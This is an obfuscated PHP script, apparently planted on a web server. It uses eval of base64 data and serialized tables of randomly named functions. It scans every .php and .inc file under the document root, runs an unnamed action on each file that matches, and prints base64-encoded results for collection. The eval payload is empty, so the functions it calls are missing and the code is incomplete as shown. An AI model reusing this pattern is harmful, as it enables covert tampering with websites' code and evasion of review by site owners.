eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo3ODp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo2OiJyeGJrcWciO2k6MjtzOjU6ImdzemZoIjt9aToxO2E6Mzp7aTowO2k6NTtpOjE7czo5OiJyYmx4dG5kbnoiO2k6MjtzOjc6Imd0dW51cWsiO31pOjI7YTozOntpOjA7aToxNTtpOjE7czo4OiJya3Rib2J0aSI7aToyO3M6OToiZ3N5b2FueXFnIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6MTE6InJpa3ZqeWhvbHllIjtpOjI7czo4OiJncmNqcGRzZiI7fWk6NDthOjM6e2k6MDtpOjIzO2k6MTtzOjU6InJydmZ1IjtpOjI7czo0OiJna3pwIjt9aTo1O2E6Mzp7aTowO2k6MzY7aToxO3M6MTA6InJsbnp4aGlua3giO2k6MjtzOjExOiJnaXNvZnlkcnBlYyI7fWk6NjthOjM6e2k6MDtpOjQyO2k6MTtzOjU6InJ3amJrIjtpOjI7czo4OiJnbHFld2hheiI7fWk6NzthOjM6e2k6MDtpOjU0O2k6MTtzOjc6InJrcndhY3oiO2k6MjtzOjU6Imd4bXd6Ijt9aTo4O2E6Mzp7aTowO2k6NjA7aToxO3M6NDoicmxvcSI7aToyO3M6MTE6ImdrYnRxeGJkemtqIjt9aTo5O2E6Mzp7aTowO2k6ODk7aToxO3M6MTA6InJwY3lvbWt1cXQiO2k6MjtzOjY6Imd6em1hbSI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6NToicmtkcXgiO2k6MjtzOjc6ImducWp6bmIiO31pOjExO2E6Mzp7aTowO2k6MTEwO2k6MTtzOjg6InJudGNmY3VmIjtpOjI7czo3OiJnb2JlbmV0Ijt9aToxMjthOjM6e2k6MDtpOjExMTtpOjE7czo3OiJydmxoZHFhIjtpOjI7czoxMToiZ290YXFjY3RjenciO31pOjEzO2E6Mzp7aTowO2k6MTEyO2k6MTtzOjQ6InJjbm4iO2k6MjtzOjExOiJnZGRsZHB0bW10diI7fWk6MTQ7YTozOntpOjA7aToxMTU7aToxO3M6NToicmZnZ3MiO2k6MjtzOjc6ImdwZ2Zvc2siO31pOjE1O2E6Mzp7aTowO2k6MTE4O2k6MTtzOjg6InJzaHRyc2FtIjtpOjI7czoxMToiZ3JtZXFxdmF4cm0iO31pOjE2O2E6Mzp7aTowO2k6MTI2O2k6MTtzOjY6InJxdHppYiI7aToyO3M6ODoiZ2NvYXh5cmgiO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjg6InJ0cHJxaXZ6IjtpOjI7czoxMToiZ2pvZWZxYmFseWEiO31pOjE4O2E6Mzp7aTowO2k6MTMwO2k6MTtzOjc6InJueGx3a2MiO2k6MjtzOjg6Imd3cmp2aWJwIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czoxMToicnVvZWVzYnBoZ2siO2k6MjtzOjEwOiJndmtwZGx4bW9tIjt9aToyMDthOjM6e2k6MDtpOjEzODtpOjE7czo4OiJyd2d1ZGN0byI7aToyO3M6NToiZ3djbHYiO31pOjIxO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjQ6InJlYWMiO2k6MjtzOjk6Imdob3F0cW10dCI7fWk6MjI7YTozOntpOjA7aToxNTc7aToxO3M6OToicnpicWFoYmJoIjtpOjI7czo5OiJnbG1nbmVrbHIiO31pOjIzO2E6Mzp7aTowO2k6MTYzO2k6MTtzOjQ6InJzb2wiO2k6MjtzOjg6Imd4YWllc2pmIjt9aToyNDthOjM6e2k6MDtpOjE3MjtpOjE7czo0OiJyZmdtIjtpOjI7czo5OiJndHprenF6c3UiO31pOjI1O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjEwOiJybG5iempiZWNhIjtpOjI7czo4OiJnc2RyZW9ndiI7fWk6MjY7YTozOntpOjA7aToxNzk7aToxO3M6OToicndkbXFqb3dmIjtpOjI7czo2OiJnYmN4aHIiO31pOjI3O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjEwOiJydmVkbXlubXhhIjtpOjI7czo5OiJnb3RrZ2JkaHAiO31pOjI4O2E6Mzp7aTowO2k6MTg5O2k6MTtzOjg6InJnZmNhenhsIjtpOjI7czo0OiJnc3d2Ijt9aToyOTthOjM6e2k6MDtpOjE5MjtpOjE7czo0OiJyZ211IjtpOjI7czo4OiJnaW1jb25jbCI7fWk6MzA7YTozOntpOjA7aToxOTY7aToxO3M6MTE6InJxZ3NqcmlvYnBmIjtpOjI7czo0OiJncXFsIjt9aTozMTthOjM6e2k6MDtpOjE5ODtpOjE7czo5OiJybm51YnRqYmsiO2k6MjtzOjc6ImdoaWp5c3oiO31pOjMyO2E6Mzp7aTowO2k6MTk5O2k6MTtzOjQ6InJqY3kiO2k6MjtzOjk6Imd4ZmtwdHFxYiI7fWk6MzM7YTozOntpOjA7aToyMDA7aToxO3M6ODoicnVkZWp4bm8iO2k6MjtzOjQ6Imd6dWYiO31pOjM0O2E6Mzp7aTowO2k6MjAxO2k6MTtzOjU6InJid3V0IjtpOjI7czo4OiJnamZ1ZnJtbCI7fWk6MzU7YTozOntpOjA7aToyMDM7aToxO3M6NToicmNwenkiO2k6MjtzOjEwOiJnbHJ4Zm1odnZxIjt9aTozNjthOjM6e2k6MDtpOjIwNjtpOjE7czo3OiJyeGRnZ3ptIjtpOjI7czoxMDoiZ2N2c2hxYmJyciI7fWk6Mzc7YTozOntpOjA7aToyMDk7aToxO3M6MTA6InJidWpteHN6YXUiO2k6MjtzOjk6ImduaG1pc2h1bSI7fWk6Mzg7YTozOntpOjA7aToyMTA7aToxO3M6MTE6InJjZXdsdnR0dmZlIjtpOjI7czo4OiJnZ3dkd25sZCI7fWk6Mzk7YTozOntpOjA7aToyMTI7aToxO3M6MTE6InJ6bm9nZGRza3VrIjtpOjI7czo1OiJncHhndyI7fWk6NDA7YTozOntpOjA7aToyMTM7aToxO3M6MTE6InJhcXB6YWZ2b2xzIjtpOjI7czoxMToiZ3lwYW16bnBncXoiO31pOjQxO2E6Mzp7aTowO2k6MjE0O2k6MTtzOjU6InJmb2xnIjtpOjI7czo4OiJndHpqdHB1YyI7fWk6NDI7YTozOntpOjA7aToyMTU7aToxO3M6NDoicmJydSI7aToyO3M6MTE6ImdheHZxZ2Vwc2dyIjt9aTo0MzthOjM6e2k6MDtpOjIxNjtpOjE7czo4OiJyYWxzaWpxdiI7aToyO3M6OToiZ3RpY2xuY3pyIjt9aTo0NDthOjM6e2k6MDtpOjIxNztpOjE7czoxMToicnZrZ3RqbHR2a24iO2k6MjtzOjExOiJnZGRkYnhsdnZodiI7fWk6NDU7YTozOntpOjA7aToyMTg7aToxO3M6MTA6InJoZmNqbmVybmUiO2k6MjtzOjEwOiJnbW11eGVnYW9mIjt9aTo0NjthOjM6e2k6MDtpOjIyMTtpOjE7czo5OiJycXl4c2ttbHUiO2k6MjtzOjQ6ImdtaWQiO31pOjQ3O2E6Mzp7aTowO2k6MjIyO2k6MTtzOjU6InJmdGJ5IjtpOjI7czoxMToiZ3lkcXhkeHZ3Y2YiO31pOjQ4O2E6Mzp7aTowO2k6MjIzO2k6MTtzOjg6InJjYWVudm1yIjtpOjI7czo3OiJnaWhqc3RqIjt9aTo0OTthOjM6e2k6MDtpOjIyNDtpOjE7czoxMDoicnhiaGxjcGthYiI7aToyO3M6MTE6ImdzaWxwcW1xd3RqIjt9aTo1MDthOjM6e2k6MDtpOjIyNTtpOjE7czoxMDoicnRhb2VueWhuYyI7aToyO3M6NjoiZ2VzaHJ4Ijt9aTo1MTthOjM6e2k6MDtpOjIzMDtpOjE7czo5OiJyY3Vsemx3YmoiO2k6MjtzOjc6ImdsZm9ydWoiO31pOjUyO2E6Mzp7aTowO2k6MjMyO2k6MTtzOjk6InJja2d2emt2ciI7aToyO3M6NjoiZ3NxY3J0Ijt9aTo1MzthOjM6e2k6MDtpOjIzNTtpOjE7czo2OiJyam12dHUiO2k6MjtzOjY6Imd5ZmxiYiI7fWk6NTQ7YTozOntpOjA7aToyMzY7aToxO3M6NDoicnRpbyI7aToyO3M6NjoiZ2dqcmtlIjt9aTo1NTthOjM6e2k6MDtpOjIzNztpOjE7czo0OiJyaWdwIjtpOjI7czo4OiJnamZycHJ6aSI7fWk6NTY7YTozOntpOjA7aToyMzg7aToxO3M6OToicmN2bnZndmFnIjtpOjI7czo4OiJneWZiZXN6dyI7fWk6NTc7YTozOntpOjA7aToyMzk7aToxO3M6Nzoicml4a2lxeiI7aToyO3M6NzoiZ3h5YmlkcyI7fWk6NTg7YTozOntpOjA7aToyNDA7aToxO3M6ODoicnFzc2toYWMiO2k6MjtzOjc6ImdyeWFhZ28iO31pOjU5O2E6Mzp7aTowO2k6MjQxO2k6MTtzOjk6InJ1dGhxZmxqZCI7aToyO3M6MTA6ImdoYnJ3cXV5b2kiO31pOjYwO2E6Mzp7aTowO2k6MjQyO2k6MTtzOjExOiJyaXFxdHRwd2RkZCI7aToyO3M6NjoiZ2l3ZGJpIjt9aTo2MTthOjM6e2k6MDtpOjI0MztpOjE7czoxMToicnl3YmN5Zm9vbHQiO2k6MjtzOjExOiJneGhoaG5paXZpZCI7fWk6NjI7YTozOntpOjA7aToyNDQ7aToxO3M6NDoicnlnciI7aToyO3M6ODoiZ21icnRzd2EiO31pOjYzO2E6Mzp7aTowO2k6MjQ1O2k6MTtzOjg6InJ1dnN5d3BvIjtpOjI7czo3OiJnZWlkYnhhIjt9aTo2NDthOjM6e2k6MDtpOjI0NjtpOjE7czo0OiJycGJhIjtpOjI7czo0OiJnaGd0Ijt9aTo2NTthOjM6e2k6MDtpOjI0NztpOjE7czo2OiJycHR3ZmsiO2k6MjtzOjc6ImdvaGh1eWMiO31pOjY2O2E6Mzp7aTowO2k6MjQ4O2k6MTtzOjk6InJpcHVjcHpjbiI7aToyO3M6MTA6Imd0bnBnZWV1Z2ciO31pOjY3O2E6Mzp7aTowO2k6MjQ5O2k6MTtzOjEwOiJydnJxeWJ2bWJwIjtpOjI7czoxMToiZ29reG93cXV5YmUiO31pOjY4O2E6Mzp7aTowO2k6MjUwO2k6MTtzOjc6InJvam1jYnAiO2k6MjtzOjc6Imdtc3FhcmUiO31pOjY5O2E6Mzp7aTowO2k6MjUxO2k6MTtzOjc6InJqdWhuYWMiO2k6MjtzOjU6ImdpZHRkIjt9aTo3MDthOjM6e2k6MDtpOjI1MjtpOjE7czo4OiJyY2p4YWxkdiI7aToyO3M6NzoiZ2JteGtuYSI7fWk6NzE7YTozOntpOjA7aToyNTM7aToxO3M6ODoicnpmbGh4cGIiO2k6MjtzOjg6Imdyd2ZjZmZuIjt9aTo3MjthOjM6e2k6MDtpOjI1NDtpOjE7czo2OiJyZmZ0anYiO2k6MjtzOjg6Imd2dWVpcndtIjt9aTo3MzthOjM6e2k6MDtpOjI1NTtpOjE7czo4OiJyY3ZodmVmZSI7aToyO3M6ODoiZ2txZ3J5eXciO31pOjc0O2E6Mzp7aTowO2k6MjU2O2k6MTtzOjk6InJidmx4eHlwbiI7aToyO3M6ODoiZ2FsdHlydHoiO31pOjc1O2E6Mzp7aTowO2k6MjU3O2k6MTtzOjEwOiJyc29pa2tmZ25yIjtpOjI7czoxMDoiZ29jdnZtcWh3YSI7fWk6NzY7YTozOntpOjA7aToyNTg7aToxO3M6Njoicmh5a2xiIjtpOjI7czoxMDoiZ3FwaHRlZnh5YyI7fWk6Nzc7YTozOntpOjA7aToyNTk7aToxO3M6NjoicnNmeXRnIjtpOjI7czo4OiJnbG13eWR0aCI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();